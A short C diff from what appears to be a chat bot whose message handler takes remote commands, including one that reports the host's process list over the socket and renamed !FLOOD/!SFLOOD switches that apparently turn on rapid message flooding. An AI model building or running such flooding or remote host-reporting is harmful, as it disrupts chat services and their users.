@@ -574,6 +574,7 @@ else
 }//ELSE
 }//END if(strstr(msg, "JOINTO") != NULL )
 ///
+
 else if(strstr(msg, "HELP") != NULL )
 {
  char tmp[SIZEBUFFER];
@@ -593,15 +594,19 @@ else if(strstr(msg, "!ЛАМПОЧКА") != NULL && !LambsWork )
 
 ///
 else if(strstr(msg, "PSAUX") != NULL ) 
+{
  if(pthread_create(&_forCommands,NULL,&getProccess,socket) ==-1)error("No can create thread:(");
+}
 else if(strstr(msg, "QUIT") != NULL )
  QUIT(socket);
-else if(strstr(msg,"STARTFLOOD") != NULL)
+else if(strstr(msg,"!FLOOD") != NULL)
  {
+  puts("...Init...");
+  NEEDFORFUCKOFF=10000;
   WAITMESSAGE=false;
   TIMETROLL=1;
  }
-else if(strstr(msg,"STOPFLOOD") != NULL)
+else if(strstr(msg,"!SFLOOD") != NULL)
 {
   WAITMESSAGE=true;
   TIMETROLL=666;
